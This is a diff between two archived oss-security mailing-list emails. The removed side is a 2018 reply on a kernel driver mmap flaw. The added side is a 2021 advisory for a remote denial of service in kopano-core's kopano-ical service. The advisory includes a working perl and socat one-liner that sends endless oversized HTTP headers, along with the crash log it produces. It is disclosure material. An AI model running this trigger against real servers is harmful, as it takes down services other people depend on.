@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1342" "Friday" "6" "July" "2018" "16:54:22" "+0200" "Solar Designer" "solar@openwall.com" "<20180706145422.GA29390@openwall.com>" "26" "Re: [oss-security] mmap vulnerability in motion eye video4linux driver for Sony Vaio PictureBook" "^Cc:" nil nil "7" "2018070614:54:22" "[oss-security] mmap vulnerability in motion eye video4linux driver for Sony Vaio PictureBook" (number mark "        solar@openwa Jul  6   26/1342  " thread-indent "\"Re: [oss-security] mmap vulnerability in motion eye video4linux driver for Sony Vaio PictureBook\"\n") "<20180706132655.GA1466@kroah.com>" ("<20180706123543.E8F634800B4@webmail.sinamail.sina.com.cn>" "<20180706132655.GA1466@kroah.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1905" "Friday" "19" "March" "2021" "13:44:24" "+0100" "Jan Engelhardt" "jengelh@inai.de" nil "47" "[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion" nil nil nil "3" nil nil (number mark "U       jengelh@inai Mar 19   47/1905  " thread-indent "\"[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 23779 invoked by uid 550); 6 Jul 2018 14:58:19 -0000
+Received: (qmail 21863 invoked by uid 550); 19 Mar 2021 12:45:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,44 +11,62 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 21663 invoked from network); 6 Jul 2018 14:54:40 -0000
-Message-ID: <20180706145422.GA29390@openwall.com>
-References: <20180706123543.E8F634800B4@webmail.sinamail.sina.com.cn> <20180706132655.GA1466@kroah.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20180706132655.GA1466@kroah.com>
-User-Agent: Mutt/1.4.2.3i
-Cc: zrlw@sina.com
-Date: Fri, 6 Jul 2018 16:54:22 +0200
-From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] mmap vulnerability in motion eye video4linux driver for Sony Vaio PictureBook
+Received: (qmail 21550 invoked from network); 19 Mar 2021 12:44:35 -0000
+Date: Fri, 19 Mar 2021 13:44:24 +0100 (CET)
+From: Jan Engelhardt <jengelh@inai.de>
 To: oss-security@lists.openwall.com
+Message-ID: <r4p33o1o-q1pp-8932-qso-36op579rn850@vanv.qr>
+User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8BIT
+Subject: [oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion
 
-On Fri, Jul 06, 2018 at 03:26:55PM +0200, Greg KH wrote:
-> On Fri, Jul 06, 2018 at 08:35:43PM +0800, zrlw@sina.com wrote:
-> > Hi all,i found a vulnerability in motion eye video4linux driver for Sony Vaio PictureBook,it desn't validate user-controlled parameter 'vma->vm_pgoff', a malicious process might access all of kernel memory from user space by trying pass different arbitrary address.
-> > /usr/src/linux-4.4.21-69/drivers/media/pci/meye/meye.c:
-> > static int meye_mmap(struct file *file, struct vm_area_struct *vma)
-> > ...        unsigned long offset = vma->vm_pgoff << PAGE_SHIFT;
-> > ...        pos = (unsigned long)meye.grab_fbuffer + offset;
-> >         while (size > 0) {
-> >                 page = vmalloc_to_pfn((void *)pos);
-> >                 if (remap_pfn_range(vma, start, page, PAGE_SIZE, PAGE_SHARED)) {...
-> 
-> Commit:
-> 	be83bbf80682 ("mmap: introduce sane default mmap limits")
-> which was backported to all stable kernels, should have resolved this
-> problem, correct?
-> 
-> If not, please notify the media driver maintainers and they will be glad
-> to fix the problem.
 
-I think zrlw@sina.com is not subscribed, so CC'ing.
+Initial publication, no CVE number yet (will request).
 
-I wonder if it's also possible to cause integer overflow on "(unsigned
-long)meye.grab_fbuffer + offset", bringing pos below meye.grab_fbuffer,
-and what the impact of that would be.
+# Affected versions
 
-Alexander
+  * kopano-core 11.0.1     (current head of 11.x branch)
+  * kopano-core 10.0.7     (head of 10.x branch)
+  * kopano-core 9.1.0      (head of 9.x branch)
+  * kopano-core 8.7.16
+  * it is believed this affects all versions to date,
+    including zarafa 7.2.6, the discontinued predecessor
+    project to Kopano, sometimes still in use.
+
+The "kopano-ical" program implements a network service/trivial HTTP server.
+It imposes no length restrictions on HTTP headers, which can be exploited
+to memory-exhaust the process and have it terminate.
+
+# Trigger
+
+»
+  perl -e 'print "GET / HTTP/1.0\nHost: \n"; 
+           while(1) { print " " . "A" x 65000 . "\n"; }' |
+  socat - tcp-connect:kopano-ical.example.com:8080
+
+The exact port depends on configuration; 8000 is also typical choice.
+
+» systemctl status kopano-ical
+● kopano-ical.service - Kopano Groupware Core iCal/CalDAV Gateway
+   Loaded: loaded (/usr/lib/systemd/system/kopano-ical.service; enabled; vendor preset: disabled)
+   Active: failed (Result: signal) since Fri 2021-03-19 13:24:26 CET; 32s ago
+     Docs: man:kopano-ical(8)
+           man:kopano-ical.cfg(5)
+  Process: 2126 ExecStart=/usr/sbin/kopano-ical -F (code=killed, signal=ABRT)
+ Main PID: 2126 (code=killed, signal=ABRT)
+
+kopano-ical[2126]: terminate called after throwing an instance of 'std::bad_alloc'
+kopano-ical[2126]: ----------------------------------------------------------------------
+kopano-ical[2126]: Fatal error detected. Please report all following information.
+kopano-ical[2126]: kopano-ical 8.7.16.0
+kopano-ical[2126]:   what():  std::bad_alloc
+systemd[1]: kopano-ical.service: Main process exited, code=killed, status=6/ABRT
+systemd[1]: kopano-ical.service: Unit entered failed state.
+systemd[1]: kopano-ical.service: Failed with result 'signal'.
+
+# Mitigation
+
+None known at this time.
